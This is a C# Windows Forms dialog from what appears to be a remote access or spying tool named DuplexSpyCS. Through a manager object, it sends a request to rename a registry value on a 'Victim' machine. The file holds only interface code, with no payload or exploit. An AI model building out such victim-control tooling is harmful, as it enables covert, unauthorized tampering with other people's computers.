using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmRegValRename : Form
    {
        public frmManager f_mgr;
        public Victim v;

        public string currentPath;
        public string oldName;

        public frmRegValRename()
        {
            InitializeComponent();
        }

        void setup()
        {
            textBox1.Text = oldName;
            textBox1.ReadOnly = true;
        }

        private void frmRegValRename_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            new Thread(() => f_mgr.Reg_ReqValueRename(currentPath, oldName, textBox2.Text)).Start();
        }
    }
}
